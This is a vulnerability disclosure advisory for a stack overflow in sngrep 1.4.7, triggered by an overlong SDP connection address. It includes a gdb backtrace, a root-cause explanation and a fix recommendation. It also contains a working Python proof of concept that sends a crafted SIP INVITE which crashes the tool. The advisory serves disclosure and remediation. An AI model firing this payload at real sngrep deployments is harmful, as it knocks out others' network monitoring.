# sngrep crashes due to a stack overflow caused by a malformed SDP connection address

- Fixed versions: 1.4.8
- Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2020-04-sngrep-malformed-connection-address>
- Tested vulnerable versions: 1.4.7
- Timeline:
    - Report date: 2020-09-16
    - sngrep confirmed issue + patch: 2020-09-16
    - sngrep release with fix: 2020-11-10
    - Enable Security advisory: 2020-11-20

## Description

When sending a specially crafted SIP message with a malformed SDP connection address, `sngrep` crashes due to a stack overflow. The following backtrace was generated during our tests:

```
(gdb) bt
#0  __GI_raise (sig=sig@entry=6)
    at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007ffff7ced859 in __GI_abort () at abort.c:79
#2  0x00007ffff7d583ee in __libc_message (
    action=action@entry=do_abort, 
    fmt=fmt@entry=0x7ffff7e8207c "*** %s ***: terminated\n")
    at ../sysdeps/posix/libc_fatal.c:155
#3  0x00007ffff7dfa9ba in __GI___fortify_fail (
    msg=msg@entry=0x7ffff7e82064 "stack smashing detected")
    at fortify_fail.c:26
#4  0x00007ffff7dfa986 in __stack_chk_fail () at stack_chk_fail.c:24
#5  0x0000555555560651 in sip_parse_msg_media (msg=0x7ffff0046c60, 
    payload=<optimized out>) at sip.c:740
#6  0x3131313131313131 in ?? ()
#7  0x3131313131313131 in ?? ()
```

The issue was originally discovered during [OpenSIPIt](https://opensipit.org/); tracked down and analyzed for severity and impact later.

## Impact

Since most modern build systems will automatically include run-time best practice checks, it is highly unlikely that this stack overflow issue is exploited. However, due to how fortify protection works, the program will still end up crashing. Nonetheless, this issue should not be dismissed by relying on build system protections and should be adequately fixed.

## How to reproduce the issue

1. Run `sngrep`
1. Execute the following python program:

```python
import socket

sdp="v=0\r\n" + \
    "o=- 1600157102 1600157102 IN IP4 127.0.0.1\r\n" + \
    "s=-\r\n" + \
    "c=IN IP4 127.0.0.1%s\r\n" % ('1' * 512) + \
    "t=0 0\r\n" + \
    "m=audio 9999 RTP/AVP 8 0 96 101\r\n" + \
    "a=rtpmap:8 PCMA/8000/1\r\n" + \
    "a=rtpmap:0 PCMU/8000/1\r\n" + \
    "a=rtpmap:96 opus/96000/2\r\n" + \
    "a=rtpmap:101 telephone-event/8000/1\r\n" + \
    "a=sendrecv"

sip_msg="INVITE sip:bob_1@127.0.0.1:5060 SIP/2.0\r\n" + \
    "Via: SIP/2.0/UDP 127.0.0.1:40111;rport;branch=z9hG4bK-a\r\n" + \
    "Max-Forwards: 70\r\n" + \
    "From: <sip:bob_1@127.0.0.1:5060>;tag=3Ewqeuo81F1Hjvtg\r\n" + \
    "To: <sip:bob_1@127.0.0.1:5060>\r\n" + \
    "Call-ID: maooZ4nDzmArTBkT\r\n" + \
    "CSeq: 1020 INVITE\r\n" + \
    "Contact: <sip:bob_1@127.0.0.1:40111;transport=udp>\r\n" + \
    "Content-Length: %i\r\n" % len(sdp) + \
    "Content-Type: application/sdp\r\n" + \
    "\r\n" + \
    sdp

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(sip_msg.encode(), ("127.0.0.1", 5060))
```
1. Notice that `sngrep` has crashed

## Solutions and recommendations

The issue arises due to the use of `sscanf` on line 716. The length of `dst.ip` is 16, so, `sscanf` will overwrite any adjacent memory. It is recommended that the IP is first parsed, its length validated and then, if valid, the value of `dst.ip` is set.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

